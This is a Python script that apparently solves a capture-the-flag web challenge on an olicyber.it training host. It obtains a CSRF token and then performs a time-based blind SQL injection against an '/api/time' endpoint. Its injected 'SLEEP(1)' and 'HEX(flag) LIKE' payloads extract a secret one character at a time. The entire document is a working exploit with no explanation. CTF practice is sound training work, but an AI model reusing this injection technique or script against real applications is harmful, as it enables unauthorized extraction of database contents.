import requests
import time

url = 'http://web-17.challs.olicyber.it'
alpha = '0123456789abcdef'
sess = requests.Session()
csrf = sess.get(url + '/api/get_token')
headers = {
        'X-CSRFToken' : csrf.json()['token']
    }
flag = ''
while True:
    for i in alpha:
        data = {'query' : f"1' AND (SELECT 1 FROM flags WHERE HEX(flag) LIKE '{flag + i}%' AND SLEEP(1))=1 -- "}
        start = time.perf_counter()
        resp = sess.post(url + '/api/time', json=data, headers=headers)
        end = time.perf_counter()
        if end - start > 1:
            flag += i
            i = alpha[0]
            break
    else:
        break
print(bytes.fromhex(flag).decode())